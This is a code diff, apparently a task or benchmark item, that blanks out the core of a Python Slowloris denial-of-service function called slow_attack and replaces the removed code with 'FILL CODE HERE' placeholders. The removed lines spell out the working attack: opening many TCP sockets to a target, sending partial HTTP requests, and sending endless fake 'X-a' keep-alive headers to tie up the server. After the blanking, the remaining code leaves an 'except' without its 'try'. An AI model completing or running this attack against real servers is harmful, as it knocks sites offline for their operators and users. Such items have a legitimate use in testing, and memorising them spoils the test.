@@ -15,28 +15,21 @@ def slow_attack(target_ip, target_port, num_connections):
     # Starts by opening multiple TCP sockets to the target.
     for _ in range(num_connections):
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            s.connect((target_ip, target_port))
-            list_of_sockets.append(s)
+            # FILL CODE HERE
         except socket.error as e:
             print(f"Socket creation failed: {e}")
             break
 
     # Send partial HTTP request
     for s in list_of_sockets:
-        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
-        s.send(f"User-Agent: {user_agent}\r\n".encode("utf-8"))
-        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
+    # FILL CODE HERE
 
     try:
         # Keep-alive loop
         # Every 15 seconds, it sends a fake header (X-a) with random values.
         while True:
             print(f"Sending keep-alive headers... Sockets open: {len(list_of_sockets)}")
-            for s in list(list_of_sockets):
-                try:
-                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
+            # FILL CODE HERE
                 except socket.error:
                     list_of_sockets.remove(s)
             
